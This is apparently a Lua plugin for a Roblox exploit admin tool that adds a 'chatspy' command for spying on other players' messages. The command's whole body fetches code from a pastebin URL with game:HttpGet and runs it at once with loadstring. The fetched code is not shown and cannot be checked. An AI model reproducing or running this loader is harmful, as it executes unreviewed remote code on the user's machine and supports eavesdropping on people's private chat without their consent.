local Plugin = {
	["PluginName"] = "Chat Spy",
	["PluginDescription"] = "DA Descriptions Don't Load",
	["Commands"] = {
		["chatspy"] = {
			["ListName"] = "chatspy",
			["Description"] = "Spy on Messages",
			["Aliases"] = {},
			["Function"] = function(args,speaker)
				 loadstring(game:HttpGet("https://pastebin.com/raw/fQ54xXEn"))()
			end,
		},
	},
}
return Plugin
